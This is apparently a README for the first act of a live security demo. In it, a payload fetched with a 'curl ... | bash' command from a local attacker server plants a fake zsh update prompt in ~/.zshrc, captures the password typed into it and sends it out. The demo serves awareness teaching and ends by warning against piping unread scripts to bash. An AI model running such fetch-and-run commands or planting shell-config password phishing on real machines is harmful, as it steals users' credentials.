# Act 1 — Shell Persistence

## What It Does

Appends a malicious block to `~/.zshrc` that shows a convincing
"zsh security update" prompt on next terminal open. It captures the
password, caches it, and exfiltrates it to the attacker server.

## How to Run

Make sure the attacker server is running (`localhost:4000`), then:

```bash
curl -s http://localhost:4000/payload | bash
```

Open a new terminal — the fake update prompt will appear. Type any
fake password, then check http://localhost:4000 to see it captured.

To clean up:

```bash
chmod +x uninstall.sh && ./uninstall.sh
```

## Key Talking Point

A single `curl | bash` command — the kind you see in install instructions
everywhere — can silently modify your shell config. Always inspect scripts
before piping them to bash. Run `curl <url>` first to see what you're
about to execute.
